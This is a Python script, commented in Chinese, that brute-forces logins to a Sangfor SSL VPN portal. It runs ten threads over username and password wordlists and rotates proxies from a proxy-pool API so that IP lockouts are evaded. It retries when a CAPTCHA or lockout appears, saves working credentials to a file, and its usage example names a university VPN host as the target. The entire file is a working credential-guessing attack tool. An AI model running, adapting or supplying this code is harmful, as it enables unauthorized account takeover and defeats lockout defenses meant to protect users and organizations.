#-*- coding:utf-8 -*-
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import queue
import threading
import sys
import os
import re
 
sys.setrecursionlimit(10000) #修改默认递归次数限制
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class myThread(threading.Thread):	#派生线程子类，主要是为了实现获取线程返回值

	def __init__(self,target,args):
		threading.Thread.__init__(self)
		self.target = target
		self.args =args
		#print (self.args)

	def run(self):

		self.result = self.target(*self.args)
		
	def get_result(self):	#并没有用到，目的是获取线程的返回值
		try:
			return self.result 
		except Exception as e:
			print(e)


def get_proxy():	#调用api获取一个https代理
    return requests.get("http://{}:5010/get/".format(proxyapi)).json()

def exploit(user,dic):
	try:
		data = {"svpn_name":"{}".format(user),"svpn_password":"{}".format(dic),"svpn_rand_code":""}
		proxy = get_proxy().get("proxy")
		proxies = "https://{}".format(proxy)
		response = requests.post(url,data,proxies={"https":proxies},verify=False,timeout=5)
		verify = re.match(r'.*<Note>(.*?)</Note>',response.text).group(1)
		if verify:
			if len(verify) == 12:	#密码正确
				print ("\033[0;32;40m"+user,dic+ " :Done\033[0m")
				return user,dic
			 	
			elif len(verify) == 21:
				print(user,dic+" :WRONG password")
				return "wrong"

			elif len(verify) == 31:	#IP锁定
				print(user,dic+" :IP locked")
				r = exploit(user,dic)	#递归换代理重试
				return r
			else:	#启用验证码的情况
				print(user,dic+" :SOMETHING wrong")
				r = exploit(user,dic)	#递归换代理重试
				return r
		else:
		 	print(user,dic+" :RESPONSE error")
		 	r = exploit(user,dic)
		 	return r
		
	except Exception as e:
		#print (e)
		print(user,dic+" :Proxy error")
		#if _FINISH == False:
		try:

			requests.get("http://{}:5010/delete/?proxy={}".format(proxyapi,proxy))	#删除不好用的代理ip
			r = exploit(user,dic)
			return r
		except Exception as e:
			pass
		
def brute(i,users,pass_queue):
	print ("I'm thread" + str(i))
	while not pass_queue.empty():

		passwd = pass_queue.get()
		#print (passwd)
		for user in users:

			result = exploit(user.strip(),passwd.strip())
			if result:

				if result == "wrong":	#密码错误就换下一个			
					pass
				else:
					with open('result.txt','a+',encoding='utf-8') as f:
						f.write(result[0]+" : "+result[1] + "\r\n")
					#pass_queue.queue.clear()
					#break
			else:
				pass
				        
if __name__ =='__main__':

	"""
	python sanforbrute_t.py https://svpn.sdust.edu.cn:4433 user.txt pass.txt 127.0.0.1

	"""

	url = sys.argv[1]+"/por/login_psw.csp?type=cs&language=zh_CN&encrypt=0"
	userdic = sys.argv[2]	#用户字典
	passdic = sys.argv[3]	#密码字典
	proxyapi = sys.argv[4]	#代理地址池地址
	#dic_queue = queue.Queue()

	n = 10 # threading 数量
	mythread = []
	#passfile = open(passdic,'r',encoding='utf-8')
	#user_queue = queue.Queue()
	pass_queue = queue.Queue()
	userfile = open(userdic,'r',encoding='utf-8')
	users = userfile.readlines()
	userfile.close()


	with open(passdic,'r',encoding='utf-8') as passwd:
		for pwd in passwd:
			pass_queue.put(pwd.strip())

		
	for i in range(n):

		#username = user_queue.get()
		t = myThread(target=brute,args=(i,users,pass_queue))
		t.setDaemon(True)
		mythread.append(t)

	for t in mythread:
		t.start()

	for t in mythread:
		t.join()


	
